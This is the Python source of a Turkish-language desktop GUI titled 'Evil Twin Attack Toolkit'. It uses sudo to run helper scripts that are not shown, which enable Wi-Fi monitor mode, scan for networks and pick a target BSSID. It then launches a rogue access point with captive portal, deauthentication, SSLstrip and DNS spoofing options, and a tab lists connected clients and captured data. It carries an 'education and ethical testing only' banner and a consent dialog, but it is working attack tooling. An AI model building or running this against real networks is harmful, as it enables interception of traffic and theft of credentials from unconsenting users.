#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin Attack Toolkit - GUI Application
Masaüstü Uygulaması

Bu uygulama Evil Twin saldırılarını grafik arayüz ile yönetmenizi sağlar.
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import threading
import os
import sys
import json
import time
from datetime import datetime

class EvilTwinGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Evil Twin Attack Toolkit - GUI")
        self.root.geometry("1200x800")
        self.root.configure(bg='#2b2b2b')
        
        # Değişkenler
        self.interface_var = tk.StringVar()
        self.target_ssid_var = tk.StringVar()
        self.target_bssid_var = tk.StringVar()
        self.target_channel_var = tk.StringVar()
        self.fake_ssid_var = tk.StringVar()
        self.monitor_interface_var = tk.StringVar()
        
        # Durum değişkenleri
        self.monitor_active = False
        self.scan_active = False
        self.attack_active = False
        
        # Ağ listesi
        self.networks = []
        
        # GUI oluştur
        self.create_widgets()
        self.check_root_privileges()
        
    def create_widgets(self):
        """Ana GUI bileşenlerini oluştur"""
        # Ana stil
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'), foreground='#ff6b6b')
        style.configure('Header.TLabel', font=('Arial', 12, 'bold'), foreground='#4ecdc4')
        
        # Ana başlık
        title_frame = tk.Frame(self.root, bg='#2b2b2b')
        title_frame.pack(fill='x', padx=10, pady=5)
        
        title_label = ttk.Label(title_frame, text="🔥 Evil Twin Attack Toolkit", style='Title.TLabel')
        title_label.pack()
        
        warning_label = ttk.Label(title_frame, text="⚠️ Sadece eğitim ve etik testler için kullanın!", 
                                 foreground='#ff9f43')
        warning_label.pack()
        
        # Notebook (sekmeler)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Sekmeler oluştur
        self.create_setup_tab()
        self.create_scan_tab()
        self.create_attack_tab()
        self.create_monitor_tab()
        self.create_logs_tab()
        
        # Durum çubuğu
        self.create_status_bar()
        
    def create_setup_tab(self):
        """Kurulum sekmesi"""
        setup_frame = ttk.Frame(self.notebook)
        self.notebook.add(setup_frame, text="🔧 Kurulum")
        
        # Interface seçimi
        interface_frame = ttk.LabelFrame(setup_frame, text="Ağ Arayüzü Seçimi")
        interface_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(interface_frame, text="Wi-Fi Interface:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.interface_combo = ttk.Combobox(interface_frame, textvariable=self.interface_var, width=20)
        self.interface_combo.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Button(interface_frame, text="🔍 Arayüzleri Tara", 
                  command=self.scan_interfaces).grid(row=0, column=2, padx=5, pady=5)
        
        # Monitor mode
        monitor_frame = ttk.LabelFrame(setup_frame, text="Monitor Mode")
        monitor_frame.pack(fill='x', padx=10, pady=5)
        
        self.monitor_status_label = ttk.Label(monitor_frame, text="Durum: Pasif", foreground='red')
        self.monitor_status_label.grid(row=0, column=0, sticky='w', padx=5, pady=5)
        
        self.monitor_btn = ttk.Button(monitor_frame, text="📡 Monitor Mode Başlat", 
                                     command=self.toggle_monitor_mode)
        self.monitor_btn.grid(row=0, column=1, padx=5, pady=5)
        
        # Sistem kontrolü
        system_frame = ttk.LabelFrame(setup_frame, text="Sistem Kontrolü")
        system_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Button(system_frame, text="🔍 Araçları Kontrol Et", 
                  command=self.check_tools).pack(side='left', padx=5, pady=5)
        ttk.Button(system_frame, text="📦 Araçları Yükle", 
                  command=self.install_tools).pack(side='left', padx=5, pady=5)
        
    def create_scan_tab(self):
        """Tarama sekmesi"""
        scan_frame = ttk.Frame(self.notebook)
        self.notebook.add(scan_frame, text="📡 Ağ Tarama")
        
        # Tarama kontrolleri
        control_frame = ttk.LabelFrame(scan_frame, text="Tarama Kontrolleri")
        control_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(control_frame, text="Tarama Süresi (sn):").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.scan_time_var = tk.StringVar(value="30")
        ttk.Entry(control_frame, textvariable=self.scan_time_var, width=10).grid(row=0, column=1, padx=5, pady=5)
        
        self.scan_btn = ttk.Button(control_frame, text="🔍 Taramayı Başlat", 
                                  command=self.start_scan)
        self.scan_btn.grid(row=0, column=2, padx=5, pady=5)
        
        # Ağ listesi
        networks_frame = ttk.LabelFrame(scan_frame, text="Bulunan Ağlar")
        networks_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Treeview oluştur
        columns = ('No', 'SSID', 'BSSID', 'Kanal', 'Güvenlik', 'Sinyal')
        self.networks_tree = ttk.Treeview(networks_frame, columns=columns, show='headings', height=15)
        
        for col in columns:
            self.networks_tree.heading(col, text=col)
            self.networks_tree.column(col, width=120)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(networks_frame, orient='vertical', command=self.networks_tree.yview)
        self.networks_tree.configure(yscrollcommand=scrollbar.set)
        
        self.networks_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        # Ağ seçimi
        select_frame = ttk.Frame(scan_frame)
        select_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Button(select_frame, text="✅ Seçili Ağı Hedef Yap", 
                  command=self.select_target_network).pack(side='left', padx=5)
        ttk.Button(select_frame, text="💾 Sonuçları Kaydet", 
                  command=self.save_scan_results).pack(side='left', padx=5)
        
    def create_attack_tab(self):
        """Saldırı sekmesi"""
        attack_frame = ttk.Frame(self.notebook)
        self.notebook.add(attack_frame, text="⚔️ Evil Twin Saldırı")
        
        # Hedef bilgileri
        target_frame = ttk.LabelFrame(attack_frame, text="Hedef Ağ Bilgileri")
        target_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(target_frame, text="Hedef SSID:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_ssid_var, width=30).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(target_frame, text="Hedef BSSID:").grid(row=1, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_bssid_var, width=30).grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(target_frame, text="Kanal:").grid(row=2, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.target_channel_var, width=10).grid(row=2, column=1, sticky='w', padx=5, pady=5)
        
        ttk.Label(target_frame, text="Sahte SSID:").grid(row=3, column=0, sticky='w', padx=5, pady=5)
        ttk.Entry(target_frame, textvariable=self.fake_ssid_var, width=30).grid(row=3, column=1, padx=5, pady=5)
        
        # Saldırı seçenekleri
        options_frame = ttk.LabelFrame(attack_frame, text="Saldırı Seçenekleri")
        options_frame.pack(fill='x', padx=10, pady=5)
        
        self.captive_portal_var = tk.BooleanVar(value=True)
        self.deauth_var = tk.BooleanVar(value=False)
        self.sslstrip_var = tk.BooleanVar(value=False)
        self.dns_spoof_var = tk.BooleanVar(value=False)
        
        ttk.Checkbutton(options_frame, text="📱 Captive Portal", 
                       variable=self.captive_portal_var).grid(row=0, column=0, sticky='w', padx=5, pady=5)
        ttk.Checkbutton(options_frame, text="💥 Deauth Saldırı", 
                       variable=self.deauth_var).grid(row=0, column=1, sticky='w', padx=5, pady=5)
        ttk.Checkbutton(options_frame, text="🔓 SSLstrip", 
                       variable=self.sslstrip_var).grid(row=1, column=0, sticky='w', padx=5, pady=5)
        ttk.Checkbutton(options_frame, text="🌐 DNS Spoofing", 
                       variable=self.dns_spoof_var).grid(row=1, column=1, sticky='w', padx=5, pady=5)
        
        # Saldırı kontrolleri
        control_frame = ttk.Frame(attack_frame)
        control_frame.pack(fill='x', padx=10, pady=10)
        
        self.attack_btn = ttk.Button(control_frame, text="🚀 Saldırıyı Başlat", 
                                    command=self.start_attack, style='Accent.TButton')
        self.attack_btn.pack(side='left', padx=5)
        
        self.stop_btn = ttk.Button(control_frame, text="🛑 Saldırıyı Durdur", 
                                  command=self.stop_attack, state='disabled')
        self.stop_btn.pack(side='left', padx=5)
        
        # Durum göstergesi
        status_frame = ttk.LabelFrame(attack_frame, text="Saldırı Durumu")
        status_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        self.attack_status_text = scrolledtext.ScrolledText(status_frame, height=10, 
                                                           bg='#1e1e1e', fg='#00ff00', 
                                                           font=('Consolas', 10))
        self.attack_status_text.pack(fill='both', expand=True, padx=5, pady=5)
        
    def create_monitor_tab(self):
        """İzleme sekmesi"""
        monitor_frame = ttk.Frame(self.notebook)
        self.notebook.add(monitor_frame, text="📊 İzleme")
        
        # Bağlı istemciler
        clients_frame = ttk.LabelFrame(monitor_frame, text="Bağlı İstemciler")
        clients_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # İstemci listesi
        client_columns = ('MAC', 'IP', 'Hostname', 'Bağlantı Zamanı')
        self.clients_tree = ttk.Treeview(clients_frame, columns=client_columns, show='headings', height=8)
        
        for col in client_columns:
            self.clients_tree.heading(col, text=col)
            self.clients_tree.column(col, width=150)
        
        self.clients_tree.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Yakalanan veriler
        captured_frame = ttk.LabelFrame(monitor_frame, text="Yakalanan Veriler")
        captured_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Veri listesi
        data_columns = ('Zaman', 'İstemci', 'Tür', 'Veri')
        self.captured_tree = ttk.Treeview(captured_frame, columns=data_columns, show='headings', height=8)
        
        for col in data_columns:
            self.captured_tree.heading(col, text=col)
            self.captured_tree.column(col, width=150)
        
        self.captured_tree.pack(fill='both', expand=True, padx=5, pady=5)
        
    def create_logs_tab(self):
        """Log sekmesi"""
        logs_frame = ttk.Frame(self.notebook)
        self.notebook.add(logs_frame, text="📝 Loglar")
        
        # Log kontrolleri
        control_frame = ttk.Frame(logs_frame)
        control_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Button(control_frame, text="🔄 Logları Yenile", 
                  command=self.refresh_logs).pack(side='left', padx=5)
        ttk.Button(control_frame, text="🗑️ Logları Temizle", 
                  command=self.clear_logs).pack(side='left', padx=5)
        ttk.Button(control_frame, text="💾 Logları Kaydet", 
                  command=self.save_logs).pack(side='left', padx=5)
        
        # Log görüntüleyici
        self.logs_text = scrolledtext.ScrolledText(logs_frame, height=25, 
                                                  bg='#1e1e1e', fg='#ffffff', 
                                                  font=('Consolas', 9))
        self.logs_text.pack(fill='both', expand=True, padx=10, pady=5)
        
    def create_status_bar(self):
        """Durum çubuğu oluştur"""
        self.status_frame = tk.Frame(self.root, bg='#2b2b2b', relief='sunken', bd=1)
        self.status_frame.pack(side='bottom', fill='x')
        
        self.status_label = tk.Label(self.status_frame, text="Hazır", bg='#2b2b2b', fg='#ffffff')
        self.status_label.pack(side='left', padx=5)
        
        # Saat
        self.time_label = tk.Label(self.status_frame, bg='#2b2b2b', fg='#ffffff')
        self.time_label.pack(side='right', padx=5)
        self.update_time()
        
    def update_time(self):
        """Saati güncelle"""
        current_time = datetime.now().strftime("%H:%M:%S")
        self.time_label.config(text=current_time)
        self.root.after(1000, self.update_time)
        
    def check_root_privileges(self):
        """Root yetkilerini kontrol et (Windows'ta admin kontrolü)"""
        import platform
        
        if platform.system() == "Windows":
            try:
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                if not is_admin:
                    messagebox.showwarning(
                        "Yetki Uyarısı",
                        "Bu uygulama yönetici yetkileri gerektirebilir.\n\nBazı özellikler çalışmayabilir."
                    )
                return True  # Windows'ta devam et
            except:
                return True  # Hata durumunda devam et
        else:
            # Linux/Unix sistemler için
            if os.geteuid() != 0:
                messagebox.showwarning("Yetki Uyarısı", 
                                     "Bu uygulama root yetkileri gerektirir.\n"
                                     "Lütfen 'sudo python3 evil_twin_gui.py' ile çalıştırın.")
            return True
            
    def log_message(self, message, level="INFO"):
        """Log mesajı ekle"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        self.logs_text.insert(tk.END, log_entry)
        self.logs_text.see(tk.END)
        
        # Durum çubuğunu güncelle
        self.status_label.config(text=message)
        
    def scan_interfaces(self):
        """Mevcut ağ arayüzlerini tara"""
        import platform
        
        try:
            if platform.system() == "Windows":
                # Windows'ta netsh ile WiFi adaptörlerini listele
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                      capture_output=True, text=True, encoding='cp1254')
                interfaces = []
                
                for line in result.stdout.split('\n'):
                    if 'Name' in line and 'Wi-Fi' in line:
                        # "Name                   : Wi-Fi" formatından interface adını çıkar
                        interface = line.split(':')[1].strip()
                        interfaces.append(interface)
                
                if not interfaces:
                    # Alternatif yöntem
                    interfaces = ['Wi-Fi', 'WLAN']
                    
            else:
                # Linux/Unix için iwconfig
                result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                interfaces = []
                
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        interface = line.split()[0]
                        interfaces.append(interface)
            
            self.interface_combo['values'] = interfaces
            if interfaces:
                self.interface_combo.set(interfaces[0])
                self.log_message(f"{len(interfaces)} adet Wi-Fi arayüzü bulundu")
                # Monitor mode durumunu kontrol et (sadece Linux'ta)
                if platform.system() != "Windows":
                    self.check_monitor_status()
            else:
                self.log_message("Wi-Fi arayüzü bulunamadı", "WARNING")
                
        except Exception as e:
            self.log_message(f"Arayüz tarama hatası: {e}", "ERROR")
            
    def check_monitor_status(self):
        """Mevcut monitor mode durumunu kontrol et"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'Mode:Monitor' in line:
                    interface = line.split()[0]
                    self.monitor_active = True
                    self.monitor_status_label.config(text="Durum: Aktif", foreground='green')
                    self.monitor_btn.config(text="📡 Monitor Mode Durdur")
                    self.monitor_interface_var.set(interface)
                    self.log_message(f"Monitor mode zaten aktif: {interface}")
                    return
            
            # Monitor mode bulunamadı
            self.monitor_active = False
            self.monitor_status_label.config(text="Durum: Pasif", foreground='red')
            self.monitor_btn.config(text="📡 Monitor Mode Başlat")
            
        except Exception as e:
            self.log_message(f"Monitor mode kontrol hatası: {e}", "ERROR")
            
    def toggle_monitor_mode(self):
        """Monitor mode'u aç/kapat"""
        if not self.monitor_active:
            self.start_monitor_mode()
        else:
            self.stop_monitor_mode()
            
    def start_monitor_mode(self):
        """Monitor mode'u başlat"""
        import platform
        
        # Windows kontrolü
        if platform.system() == "Windows":
            messagebox.showwarning(
                "Platform Uyarısı",
                "Bu özellik Linux/Unix sistemlerde çalışır.\n\n"
                "Windows'ta WiFi monitor mode için:\n"
                "• Kali Linux (WSL2) kullanın\n"
                "• VirtualBox/VMware ile Linux VM\n"
                "• Dual boot Linux sistemi"
            )
            self.log_message("Monitor mode Windows'ta desteklenmiyor", "WARNING")
            return
            
        interface = self.interface_var.get()
        if not interface:
            messagebox.showerror("Hata", "Lütfen bir arayüz seçin")
            return
            
        try:
            # Monitor mode scripti çalıştır
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            cmd = ['sudo', './scripts/monitor_mode.sh', interface]
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=script_dir)
            
            if result.returncode == 0:
                self.monitor_active = True
                self.monitor_status_label.config(text="Durum: Aktif", foreground='green')
                self.monitor_btn.config(text="📡 Monitor Mode Durdur")
                
                # Monitor interface'i bul
                monitor_interface = f"{interface}mon"
                self.monitor_interface_var.set(monitor_interface)
                
                self.log_message(f"Monitor mode başlatıldı: {monitor_interface}")
            else:
                self.log_message(f"Monitor mode hatası: {result.stderr}", "ERROR")
                
        except Exception as e:
            self.log_message(f"Monitor mode başlatma hatası: {e}", "ERROR")
            
    def stop_monitor_mode(self):
        """Monitor mode'u durdur"""
        try:
            interface = self.interface_var.get()
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            cmd = ['sudo', './scripts/restore_interface.sh', interface]
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=script_dir)
            
            self.monitor_active = False
            self.monitor_status_label.config(text="Durum: Pasif", foreground='red')
            self.monitor_btn.config(text="📡 Monitor Mode Başlat")
            
            self.log_message("Monitor mode durduruldu")
            
        except Exception as e:
            self.log_message(f"Monitor mode durdurma hatası: {e}", "ERROR")
            
    def check_tools(self):
        """Gerekli araçları kontrol et"""
        tools = ['aircrack-ng', 'hostapd', 'dnsmasq', 'iptables']
        missing_tools = []
        
        for tool in tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing_tools.append(tool)
                
        if missing_tools:
            message = f"Eksik araçlar: {', '.join(missing_tools)}"
            self.log_message(message, "WARNING")
            messagebox.showwarning("Eksik Araçlar", message)
        else:
            self.log_message("Tüm araçlar mevcut")
            messagebox.showinfo("Araç Kontrolü", "Tüm gerekli araçlar mevcut")
            
    def install_tools(self):
        """Araçları yükle"""
        try:
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            cmd = ['sudo', './setup/install_tools.sh']
            subprocess.Popen(cmd, cwd=script_dir)
            self.log_message("Araç yükleme başlatıldı")
            
        except Exception as e:
            self.log_message(f"Araç yükleme hatası: {e}", "ERROR")
            
    def start_scan(self):
        """Ağ taramasını başlat"""
        import platform
        
        if platform.system() == "Windows":
            messagebox.showwarning(
                "Platform Uyarısı",
                "Ağ tarama özelliği Linux/Unix sistemlerde çalışır.\n\n"
                "Windows'ta WiFi ağları görmek için:\n"
                "• Kali Linux (WSL2) kullanın\n"
                "• VirtualBox/VMware ile Linux VM\n"
                "• Windows WiFi ayarlarını kontrol edin"
            )
            self.log_message("Ağ tarama Windows'ta desteklenmiyor", "WARNING")
            return
            
        if not self.monitor_active:
            messagebox.showerror("Hata", "Önce monitor mode'u başlatın")
            return
            
        if self.scan_active:
            messagebox.showwarning("Uyarı", "Tarama zaten aktif")
            return
            
        self.scan_active = True
        self.scan_btn.config(text="⏳ Taranıyor...", state='disabled')
        
        # Ağ listesini temizle
        for item in self.networks_tree.get_children():
            self.networks_tree.delete(item)
            
        # Taramayı thread'de başlat
        scan_thread = threading.Thread(target=self._scan_networks)
        scan_thread.daemon = True
        scan_thread.start()
        
    def _scan_networks(self):
        """Ağ tarama işlemi (thread)"""
        try:
            scan_time = self.scan_time_var.get()
            monitor_interface = self.monitor_interface_var.get()
            
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            cmd = ['sudo', './scripts/scan_networks.sh', '-i', monitor_interface, '-t', scan_time, '-s']
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=script_dir)
            
            if result.returncode == 0:
                self._parse_scan_results()
                self.log_message("Ağ taraması tamamlandı")
            else:
                self.log_message(f"Tarama hatası: {result.stderr}", "ERROR")
                
        except Exception as e:
            self.log_message(f"Tarama işlemi hatası: {e}", "ERROR")
        finally:
            self.scan_active = False
            self.root.after(0, lambda: self.scan_btn.config(text="🔍 Taramayı Başlat", state='normal'))
            
    def _parse_scan_results(self):
        """Tarama sonuçlarını parse et"""
        try:
            # CSV dosyasını oku - evil-twin ana klasöründeki logs dizininden
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            logs_dir = os.path.join(script_dir, 'logs')
            
            if not os.path.exists(logs_dir):
                return
                
            csv_files = [f for f in os.listdir(logs_dir) if f.endswith('.csv')]
            if not csv_files:
                return
                
            latest_csv = max(csv_files, key=lambda x: os.path.getctime(os.path.join(logs_dir, x)))
            
            with open(os.path.join(logs_dir, latest_csv), 'r') as f:
                lines = f.readlines()
                
            self.networks = []
            count = 0
            
            for line in lines[1:]:  # Başlık satırını atla
                if line.strip() and not line.startswith('Station MAC'):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        essid = parts[13].strip() or "<Hidden>"
                        channel = parts[3].strip()
                        privacy = parts[5].strip()
                        power = parts[8].strip()
                        
                        if bssid and bssid != 'BSSID':
                            count += 1
                            network = {
                                'no': count,
                                'ssid': essid,
                                'bssid': bssid,
                                'channel': channel,
                                'security': privacy,
                                'signal': power
                            }
                            self.networks.append(network)
                            
                            # TreeView'e ekle
                            self.root.after(0, lambda n=network: self.networks_tree.insert('', 'end', values=(
                                n['no'], n['ssid'], n['bssid'], n['channel'], n['security'], n['signal']
                            )))
                            
        except Exception as e:
            self.log_message(f"Sonuç parse hatası: {e}", "ERROR")
            
    def select_target_network(self):
        """Seçili ağı hedef yap"""
        selection = self.networks_tree.selection()
        if not selection:
            messagebox.showwarning("Uyarı", "Lütfen bir ağ seçin")
            return
            
        item = self.networks_tree.item(selection[0])
        values = item['values']
        
        self.target_ssid_var.set(values[1])
        self.target_bssid_var.set(values[2])
        self.target_channel_var.set(values[3])
        self.fake_ssid_var.set(values[1])  # Varsayılan olarak aynı SSID
        
        self.log_message(f"Hedef seçildi: {values[1]} ({values[2]})")
        messagebox.showinfo("Hedef Seçildi", f"Hedef ağ: {values[1]}\nBSSID: {values[2]}")
        
        # Saldırı sekmesine geç
        self.notebook.select(2)
        
    def save_scan_results(self):
        """Tarama sonuçlarını kaydet"""
        if not self.networks:
            messagebox.showwarning("Uyarı", "Kaydedilecek sonuç yok")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.networks, f, indent=2)
                self.log_message(f"Sonuçlar kaydedildi: {filename}")
                messagebox.showinfo("Başarılı", "Tarama sonuçları kaydedildi")
            except Exception as e:
                self.log_message(f"Kaydetme hatası: {e}", "ERROR")
                
    def start_attack(self):
        """Evil Twin saldırısını başlat"""
        import platform
        
        if platform.system() == "Windows":
            messagebox.showwarning(
                "Platform Uyarısı",
                "Evil Twin saldırısı Linux/Unix sistemlerde çalışır.\n\n"
                "Windows'ta WiFi saldırıları için:\n"
                "• Kali Linux (WSL2) kullanın\n"
                "• VirtualBox/VMware ile Linux VM\n"
                "• Dual boot Linux sistemi\n\n"
                "Bu araçlar Linux ortamında test edilmiştir."
            )
            self.log_message("Evil Twin saldırısı Windows'ta desteklenmiyor", "WARNING")
            return
            
        # Hedef kontrolü
        if not self.target_bssid_var.get():
            messagebox.showerror("Hata", "Lütfen hedef ağ seçin")
            return
            
        if self.attack_active:
            messagebox.showwarning("Uyarı", "Saldırı zaten aktif")
            return
            
        # Etik onay
        response = messagebox.askyesno(
            "Etik Onay",
            "Bu saldırıyı sadece kendi ağınızda veya izinli ortamda yapacağınızı onaylıyor musunuz?"
        )
        
        if not response:
            return
            
        self.attack_active = True
        self.attack_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        
        # Saldırıyı thread'de başlat
        attack_thread = threading.Thread(target=self._start_attack)
        attack_thread.daemon = True
        attack_thread.start()
        
    def _start_attack(self):
        """Saldırı işlemi (thread)"""
        try:
            # Komut oluştur
            cmd = ['sudo', './scripts/start_evil_twin.sh']
            cmd.extend(['-b', self.target_bssid_var.get()])
            cmd.extend(['-c', self.target_channel_var.get()])
            
            if self.fake_ssid_var.get():
                cmd.extend(['-f', self.fake_ssid_var.get()])
                
            if not self.captive_portal_var.get():
                cmd.append('-p')
                
            if self.deauth_var.get():
                cmd.append('-d')
                
            if self.sslstrip_var.get():
                cmd.append('-S')
                
            if self.dns_spoof_var.get():
                cmd.append('-D')
                
            self.log_message(f"Saldırı başlatılıyor: {' '.join(cmd)}")
            
            # Saldırıyı başlat
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            self.attack_process = subprocess.Popen(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                cwd=script_dir
            )
            
            # Çıktıyı oku
            for line in iter(self.attack_process.stdout.readline, ''):
                if line:
                    self.root.after(0, lambda l=line: self.attack_status_text.insert(tk.END, l))
                    self.root.after(0, lambda: self.attack_status_text.see(tk.END))
                    
                if not self.attack_active:
                    break
                    
        except Exception as e:
            self.log_message(f"Saldırı hatası: {e}", "ERROR")
        finally:
            self.root.after(0, self._attack_finished)
            
    def stop_attack(self):
        """Saldırıyı durdur"""
        self.attack_active = False
        
        try:
            if hasattr(self, 'attack_process'):
                self.attack_process.terminate()
                
            # Cleanup scripti çalıştır
            # GUI dosyasının bulunduğu klasörün parent dizinini al (evil-twin ana klasörü)
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            subprocess.run(['sudo', './scripts/cleanup.sh'], cwd=script_dir)
            
            self.log_message("Saldırı durduruldu")
            
        except Exception as e:
            self.log_message(f"Saldırı durdurma hatası: {e}", "ERROR")
            
    def _attack_finished(self):
        """Saldırı bittiğinde çağrılır"""
        self.attack_active = False
        self.attack_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        
    def refresh_logs(self):
        """Logları yenile"""
        try:
            # evil-twin ana klasöründeki logs dizinini kullan
            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            log_files = [
                os.path.join(script_dir, 'logs', 'evil_twin.log'),
                os.path.join(script_dir, 'logs', 'hostapd.log'),
                os.path.join(script_dir, 'logs', 'dnsmasq.log')
            ]
            
            self.logs_text.delete(1.0, tk.END)
            
            for log_file in log_files:
                if os.path.exists(log_file):
                    with open(log_file, 'r') as f:
                        content = f.read()
                        self.logs_text.insert(tk.END, f"=== {os.path.basename(log_file)} ===\n")
                        self.logs_text.insert(tk.END, content)
                        self.logs_text.insert(tk.END, "\n\n")
                        
            self.logs_text.see(tk.END)
            self.log_message("Loglar yenilendi")
            
        except Exception as e:
            self.log_message(f"Log yenileme hatası: {e}", "ERROR")
            
    def clear_logs(self):
        """Logları temizle"""
        response = messagebox.askyesno("Onay", "Tüm logları temizlemek istediğinizden emin misiniz?")
        if response:
            self.logs_text.delete(1.0, tk.END)
            self.log_message("Loglar temizlendi")
            
    def save_logs(self):
        """Logları kaydet"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.logs_text.get(1.0, tk.END))
                self.log_message(f"Loglar kaydedildi: {filename}")
                messagebox.showinfo("Başarılı", "Loglar kaydedildi")
            except Exception as e:
                self.log_message(f"Log kaydetme hatası: {e}", "ERROR")

def main():
    """Ana fonksiyon"""
    root = tk.Tk()
    app = EvilTwinGUI(root)
    
    # Pencere kapatma olayı
    def on_closing():
        if app.attack_active:
            response = messagebox.askyesno("Onay", "Saldırı aktif. Yine de çıkmak istiyor musunuz?")
            if response:
                app.stop_attack()
                root.destroy()
        else:
            root.destroy()
            
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()